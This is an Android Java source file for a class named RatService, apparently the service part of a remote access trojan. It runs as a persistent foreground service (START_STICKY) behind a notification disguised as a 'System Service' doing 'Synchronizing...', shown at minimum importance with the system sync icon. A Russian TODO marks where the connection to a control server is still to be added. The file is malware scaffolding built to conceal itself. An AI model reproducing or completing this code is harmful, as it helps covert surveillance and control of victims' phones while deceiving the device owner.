package com.zynremote.agent;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;

public class RatService extends Service {

    private static final String CH = "rat_ch";

    @Override
    public void onCreate() {
        super.onCreate();
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel(
                CH, "System Service", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Notification.Builder b;
        if (Build.VERSION.SDK_INT >= 26)
            b = new Notification.Builder(this, CH);
        else
            b = new Notification.Builder(this);

        b.setContentTitle("System Service")
         .setContentText("Синхронизация...")
         .setSmallIcon(android.R.drawable.stat_notify_sync);

        startForeground(1, b.build());

        // TODO: подключение к серверу

        return START_STICKY;
    }

    @Override public IBinder onBind(Intent intent) { return null; }
}
